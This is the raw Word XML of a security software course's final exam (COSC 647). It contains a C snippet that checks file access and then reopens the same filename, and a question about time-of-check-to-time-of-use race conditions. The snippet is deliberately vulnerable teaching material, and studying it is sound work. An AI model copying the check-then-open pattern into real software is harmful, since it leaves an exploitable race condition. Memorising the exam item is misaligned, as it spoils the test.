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1FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="37"/>
        <w:ind w:left="2332" w:right="2322"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-10"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-9"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-10"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="6"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-8"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>64</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-24"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>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-21"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-10"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-8"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-10"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-13"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-9"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-10"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="41"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-10"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>So</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-9"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-10"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-9"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-8"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-9"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="61"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-11"/>
          <w:w w:val="107"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-10"/>
          <w:w w:val="109"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>pp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-10"/>
          <w:w w:val="119"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-10"/>
          <w:w w:val="99"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-8"/>
          <w:w w:val="99"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-10"/>
          <w:w w:val="99"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-10"/>
          <w:w w:val="119"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-10"/>
          <w:w w:val="110"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-10"/>
          <w:w w:val="109"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:w w:val="113"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="76"/>
        <w:ind w:left="4503" w:right="4504"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Fi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="29"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:w w:val="96"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
          <w:w w:val="96"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:w w:val="106"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="76"/>
        <w:ind w:left="2552" w:right="2556"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Due</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="66"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="32"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  <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>0p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="27"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="3"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="50"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1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="9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201</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-6"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="35"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
          <w:w w:val="112"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:w w:val="108"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>mail</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="003F01FA">
      <w:pPr>
        <w:spacing w:before="9" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="003F01FA">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:ind w:left="104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]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.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-4"/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 xml:space="preserve">sider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ollow</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/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d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="101"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="14"/>
        <w:ind w:left="632" w:right="5958" w:hanging="264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if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canAccess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(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getFilename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() )) { </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/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>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>p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fopen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getFilename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(), "w"); d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>something(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fp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);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:ind w:left="368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}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="11" w:line="252" w:lineRule="auto"/>
        <w:ind w:left="104" w:right="266"/>
        <w:rPr>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2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e</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="113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w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>canAccess</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>(fi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="-3"/>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="-77"/>
          <w:w w:val="113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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ur</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1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s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se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urr</w:t>
      </w:r>
      <w:r>
        <w:rPr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 xml:space="preserve">t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2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low</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2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ess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le</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="19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fil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proofErr w:type="spellEnd"/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Y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19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may </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ass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me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w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>nn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1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g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
          <w:w w:val="1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le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h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ea</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6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vir</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="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m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="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t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1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proofErr w:type="gramEnd"/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co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-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c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>urr</w:t>
      </w:r>
      <w:r>
        <w:rPr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cy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issu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="105"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">s. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Can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lt 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proofErr w:type="gramEnd"/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cess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ol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iola</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2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io</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-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?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swer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1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s,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give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x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>am</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1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le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f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="121"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="116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w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">tion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getFilename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spacing w:val="-3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lts</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="11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2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p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n</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="-3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i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l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,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w</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New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z w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>even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15"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1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gh</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
          <w:w w:val="115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canAccess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(fi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l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">ename)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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ur</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="115"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s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al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e.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3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F</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u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c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ion</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="11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w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r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t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r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i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r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e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:w w:val="110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a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:w w:val="110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e</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="-1"/>
          <w:w w:val="11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w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="-77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takes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27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i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="116"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="116"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>pu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="116"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
          <w:w w:val="1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4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w w:val="101"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/O.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00373362" w:rsidRDefault="00373362">
      <w:pPr>
        <w:spacing w:before="11" w:line="252" w:lineRule="auto"/>
        <w:ind w:left="104" w:right="266"/>
